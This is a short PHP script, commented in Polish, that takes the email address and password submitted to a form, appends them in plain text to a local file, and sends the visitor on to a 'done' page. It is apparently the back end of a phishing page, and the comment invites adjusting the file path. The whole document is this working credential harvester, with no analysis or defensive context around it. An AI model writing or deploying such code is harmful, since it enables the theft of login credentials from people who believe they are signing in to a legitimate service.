<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = $_POST["email"];
    $password = $_POST["password"];

    // Zapisz do pliku (możesz dostosować ścieżkę i nazwę pliku)
    $file = fopen("zapisane_dane.txt", "a");
    fwrite($file, "Email: $email, Haslo: $password" . PHP_EOL);
    fclose($file);
	
	header("Location: done.html");
    exit();
}
?>
